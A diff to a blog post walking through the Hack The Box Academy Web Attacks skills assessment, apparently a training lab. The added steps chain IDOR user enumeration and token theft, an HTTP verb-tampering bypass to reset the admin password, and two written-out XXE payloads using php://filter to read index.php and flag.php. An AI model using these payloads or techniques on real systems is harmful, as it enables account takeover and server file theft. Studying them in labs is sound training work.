@@ -2,7 +2,7 @@
 layout: post
 title:  "Hack The Box - Academy - Web Attacks"
 description: "Explore this detailed walkthrough of Hack The Box Academy's Web Attacks module. Learn effective techniques to perform http verb tampering,Insecure Direct Object References (IDOR), XML External Entity (XXE) Injection and  elevate your penetration testing skills with step-by-step insights from Zwarts Sec."
-date:   2024-11-11 22:31
+date:   2024-11-12 19:31
 image:  /images/htb/web-attacks/logo.png
 tags:   [httb-verb-tampering,idor,xxe,cbbh]
 categories: [htbacademy]
@@ -172,17 +172,118 @@ ruby XXEinjector.rb --host={YOUR_IP_ADDRESS} --httpport=8000 --file=/tmp/xxe.req
 ><b>Overview:</b>
 You are performing a web application penetration test for a software development company, and they task you with testing the latest build of their social networking web application. Try to utilize the various techniques you learned in this module to identify and exploit multiple vulnerabilities found in the web application.<br/><br/>The login details are provided in the question below.<br/><br/>
 
-Work in progress:
+### Ensure that Caido’s proxy is intercepting all requests.
 
-1. Login with the credentials provided
-2. Intercept all request and explore the App's Main feauters
-IDOR to get user details - look for admin user
-get user token
-reset user - Notice denied and try http verb tampering. change to PUT and add query parameters.
-Login with admin user
-Explore new features notice create event notice this requests uses xml. Submit an event and see if any of the parameter's are displayed in the response.
-Use php filter to test to see if we can read local files
-Update the payload to read /flag.php
+### Log In to the Application
+
+Log in using the provided credentials.
+
+![Login](/images/htb/web-attacks/sa-login-page.png)
+
+### Explore Application Functionality
+
+![Dashboard](/images/htb/web-attacks/sa-dashboard.png)
+
+Explore the application’s features, especially the `Settings` page with a password reset option.
+### Review Login Requests in Caido
+
+![Caido Requests](/images/htb/web-attacks/sa-requests.png)
+
+Review the captured requests in Caido:
+ - Observe a 301 Redirect response following a successful login.
+ - Notice a 200 OK response loading profile.php, which fetches user data via api.php.
+ - There’s also a 200 OK response for loading Settings.php.
+ - Next, there’s an API GET call fetching a user token and a POST request to reset the password.
+
+### Investigate for Potential IDOR
+
+- Notice that the API calls include the user ID as a parameter, which could lead to an Insecure Direct Object Reference (IDOR) vulnerability.
+- Test this by modifying the api.php/user/ endpoint in Caido to see if we can access data of other users.
+
+![User Endpoint IDOR Configuration](/images/htb/web-attacks/sa-userapi-idor-configuration.png)
+
+![User Endpoint IDOR Result](/images/htb/web-attacks/sa-userapi-idor-result.png)
+
+### Enumerate Users with Caido's HTTPQL Query
+
+- Use Caido’s `HTTPQL query` feature to search for an admin user.
+
+![Admin details](/images/htb/web-attacks/sa-userapi-idor-admin.png)
+
+### Attempt Password Reset for Admin User
+
+- With the admin user ID, we'll attempt to retrieve the token by exploiting the `api.php/token` endpoint and initiate a password reset for the admin account.
+
+![Admin Token](/images/htb/web-attacks/sa-admin-token.png)
+
+- Looking at our reset password request we'll have to update the uid and the token to the `Admin` user's uid and token.
+
+![Reset Password Request](/images/htb/web-attacks/sa-resetpassword-request.png)
+
+- After updating the request to the admin details. Notice we get an error `Access Denied`, we'll bypassing this restriction using HTTP verb tampering.
+
+![Admin Reset - Access Denied](/images/htb/web-attacks/sa-resetpassword-access-denied.png)
+
+### Bypass Authorization with Verb Tampering
+
+- Change the HTTP method to PUT, notice the error `Missing Parameter`.
+![HTTP Verb Tampering](/images/htb/web-attacks/sa-verb-tampering-put-missing-parameters.png)
 
 
+- We'll add the parameters as query parameters and retry.
+
+![HTTP Verb Tampering - Result](/images/htb/web-attacks/sa-admin-password-changed.png)
+
+### Access and Explore Admin Features
+
+- Once logged in as the admin, notice the new feature `Add Event`.
+
+![Admin Portald](/images/htb/web-attacks/sa-admin-portal.png)
+
+### Exploit XXE Vulnerability in Event Creation
+
+- Create a new event, then review the Caido logs for the associated request.
+
+![Creating new event UI](/images/htb/web-attacks/sa-new-event-ui.png)
+
+![Creating new event Request](/images/htb/web-attacks/sa-new-event-request.png)
+
+- Analyzing the response we can see the `name` property in the response.
+
+### Attempt XXE Exploit with PHP Filtering
+- Since the application appears to be PHP-based, try PHP filtering to read server files.
+- Start by attempting to read `index.php` to confirm access.
+
+Use the below payload:
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/index.php">
+]>
+            <root>
+            <name>&Test;</name>
+            <details>test</details>
+            <date></date>
+            </root>
+```
+
+![PHP Filter](/images/htb/web-attacks/sa-reading-index-content.png)
+
+### Retrieve Flag
+- We'll modify the payload to read `flag.php`.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [
+    <!ENTITY Test SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
+]>
+            <root>
+            <name>&Test;</name>
+            <details>test</details>
+            <date></date>
+            </root>
+```
+
+![Reading flag](/images/htb/web-attacks/sa-reading-flag.png)
 <hr/>
